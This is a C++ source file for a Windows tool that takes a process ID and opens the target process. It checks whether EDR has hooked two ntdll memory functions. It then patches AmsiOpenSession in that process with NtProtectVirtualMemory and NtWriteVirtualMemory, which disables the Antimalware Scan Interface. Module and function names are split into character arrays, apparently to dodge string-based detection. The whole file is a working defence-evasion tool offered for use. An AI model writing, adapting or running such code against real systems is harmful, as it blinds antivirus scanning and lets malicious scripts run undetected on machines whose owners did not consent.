#include <iostream>
#include <Windows.h>
#pragma comment(lib, "ntdll")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

// Define function prototypes for NT API functions
EXTERN_C NTSTATUS NtProtectVirtualMemory(
	IN HANDLE ProcessHandle,
	IN OUT PVOID* BaseAddress,
	IN OUT PSIZE_T RegionSize,
	IN ULONG NewProtect,
	OUT PULONG OldProtect);

EXTERN_C NTSTATUS NtWriteVirtualMemory(
	IN HANDLE ProcessHandle,
	IN PVOID BaseAddress,
	IN PVOID Buffer,
	IN SIZE_T NumberOfBytesToWrite,
	OUT PSIZE_T NumberOfBytesWritten OPTIONAL);


BOOL isItHooked(LPVOID addr) {
	BYTE stub[] = "\x4c\x8b\xd1\xb8";
	if (memcmp(addr, stub, 4) != 0)
		return TRUE;
	return FALSE;
}


int main(int argc, char** argv)
{
	if (argc < 2) {
		printf("\n[*] Usage: %s <PID>\n", argv[0]);
		exit(0);
	}

	HANDLE rm_proc_hndle = OpenProcess(0x0008 | 0x0010 | 0x0020, FALSE, (DWORD)atoi(argv[1]));
	if (!rm_proc_hndle) {
		printf("\n[-] Error while getting a HANDLE to the remote process: (%u)\n", GetLastError());
		return -2;
	}

	const char ntdll[] = { 'n','t','d','l','l','.','d','l','l', 0 };
	const char NtAlloc[] = { 'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y', 0 };
	const char NtProtect[] = { 'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y', 0 };
	char ams1[] = { 'a','m','s','i','.','d','l','l',0 };
	char ams10pen[] = { 'A','m','s','i','O','p','e','n','S','e','s','s','i','o','n',0 };

	LPVOID pNtProtect = GetProcAddress(GetModuleHandleA(ntdll), NtProtect);

	if (isItHooked(pNtProtect)) {
		printf("\n[-] NtProtectVirtualMemory Hooked\n");
		return -2;
	}
	else {
		printf("\n[+] NtProtectVirtualMemory Not Hooked\n");
	}


	LPVOID pNtAlloc = GetProcAddress(GetModuleHandleA(ntdll), NtAlloc);

	if (isItHooked(pNtAlloc)) {
		printf("[-] NtAllocateVirtualMemory Hooked\n");
		return -2;
	}
	else {
		printf("[+] NtAllocateVirtualMemory Not Hooked\n");
	}

	printf("\n[+] Now Patching AMSI\n");
	HMODULE handle = LoadLibraryA(ams1);
	FARPROC amsi_proc_Address = GetProcAddress(handle, ams10pen);
	if (!amsi_proc_Address) {
		printf("Failed to get AMSI Addr (%u)\n", GetLastError());
		return -2;
	}

	DWORD oldprotect = 0;

	// Patch for AMSI
	char patch[100];
	ZeroMemory(patch, 100);
	// Pasting jne opcode
	lstrcatA(patch, "\x75");

	PVOID convert_p_amsi = (void*)((DWORD64)amsi_proc_Address + 0x3);
	SIZE_T miniSize = 0x1000;

	printf("\tStarting Address of the Function: 0x%p\n", amsi_proc_Address);
	printf("\tTarget Address of the function to Edit: 0x%p\n", convert_p_amsi);

	// NtProtectVirtualMemory equivalent to VirtualProtect
	NTSTATUS status = NtProtectVirtualMemory(rm_proc_hndle, &convert_p_amsi, &miniSize, 0x04, &oldprotect);

	if (NT_SUCCESS(status)) {
		status = NtWriteVirtualMemory(rm_proc_hndle, (void*)((DWORD64)amsi_proc_Address + 0x3), patch, 1, nullptr);
		if (NT_SUCCESS(status)) {
			// Restore original protection
			status = NtProtectVirtualMemory(rm_proc_hndle, &convert_p_amsi, &miniSize, oldprotect, &oldprotect);
			if (NT_SUCCESS(status)) {
				printf("\n[+] AMSI patched !\n");
			}
			else {
				printf("[!] Failed to restore protection (%u)\n", GetLastError());
			}
		}
		else {
			printf("\n[-] Failed to patch AMSI.\n");
		}
	}
	else {
		printf("\n[-] Failed to protect memory.\n");
	}

	return 0;
}
